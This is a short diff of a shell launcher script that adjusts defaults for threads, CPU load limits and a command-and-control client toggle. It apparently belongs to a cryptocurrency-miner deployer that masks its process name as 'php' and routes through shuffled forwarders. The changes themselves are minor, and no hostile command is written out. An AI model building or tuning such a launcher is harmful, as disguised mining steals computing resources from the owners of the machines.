@@ -4,7 +4,7 @@
 OBJ_MASK=${OBJ_MASK:-php}
 DAEMON=${DAEMON:-pausd}
 DAEMON_NAME=${DAEMON##* }
-CC_ENABLED=${CC_ENABLED:-0}
+CC_ENABLED=${CC_ENABLED:-false}
 if [ -z "$TNL_SKIP" -o "$TNL_SKIP" = 1 ]; then
     # OBJ_CFG="${OBJ_CFG:-girmx_tnl_skip.1.json.tpl}"
     OBJ_CFG="${OBJ_CFG:-girmx_2.json.tpl}"
@@ -105,7 +105,7 @@ fi
 THREADS=${THREADS_FIXED:-${THREADS:-${THREADS_D}}}
 ## init MAX_LOAD
 MAX_LOAD=${MAX_LOAD:-$((CORES*100))}
-[ "$MAX_LOAD" -lt 100 -o -z "$MAX_LOAD" ] && MAX_LOAD=100
+[ "$MAX_LOAD" -lt 1 -o -z "$MAX_LOAD" ] && MAX_LOAD=100
 ## don't setup affinity because on shared environments it yields lower performance overall
 ## because doesn't let the cpu scheduler do its job, other processes might stall causing further
 ## overhead making the system unstable, also close to useless in non-bare scenarios.
@@ -200,7 +200,7 @@ POOL
     config_pools 0
     function config_client(){
         ## only first setup
-        [ "$CC_ENABLED" -eq 0 ] && return
+        [ "$CC_ENABLED" != "true" ] && return
         if [ "$1" = 0 ]; then
             x_fwds_file="net/x_forwarders"
             export x_fwds=$(ushuffle $x_fwds_file)
